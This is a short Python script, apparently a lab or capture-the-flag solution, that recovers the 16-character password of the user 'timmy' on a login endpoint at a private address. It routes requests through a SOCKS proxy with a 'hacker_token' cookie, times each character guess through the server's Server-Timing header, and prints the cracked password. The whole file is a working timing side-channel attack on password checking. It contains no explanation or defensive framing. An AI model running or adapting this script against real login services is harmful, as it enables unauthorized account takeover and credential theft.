#!/bin/python3

import requests
from requests.exceptions import RequestException 

def main():
    # Configure session with cookie and proxy
    session = requests.Session()
    session.cookies.set('hacker_token', '81-77z7S367m03Wydr900hr3A-81')
    proxies = {'http': 'socks5://localhost:9999', 'https': 'socks5://localhost:9999'}
    
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    password_length = 16
    known_password = ""

    for position in range(password_length):
        print(f"\n=== Testing position {position} ===")
        char_stats = {}

        for char in charset:
            test_password = known_password + char + 'a' * (15 - position)
            
            try:
                response = session.post(
                    'http://192.168.1.77:5003/login',
                    data={'username': 'timmy', 'password': test_password},
                    proxies=proxies,
                    timeout=10
                )
                
                # Extract server timing
                timing_header = response.headers.get('Server-Timing', '')
                dur = int(timing_header.split(';dur=')[1]) if ';dur=' in timing_header else 0
                char_stats[char] = dur
                
                print(f"Character '{char}': Duration {dur}ms")
            
            except RequestException as e:
                print(f"Error occurred with '{char}': {e}")
                char_stats[char] = 0  # Treat errors as lowest possible duration

        # Find character with highest duration
        best_char = max(char_stats, key=lambda k: char_stats[k])
        known_password += best_char
        print(f"\nFound best character for position {position}: '{best_char}' (Duration: {char_stats[best_char]}ms)")
        print(f"Current password progress: {known_password}")

    print(f"\nFinal cracked password: {known_password}")

if __name__ == "__main__":
    main()
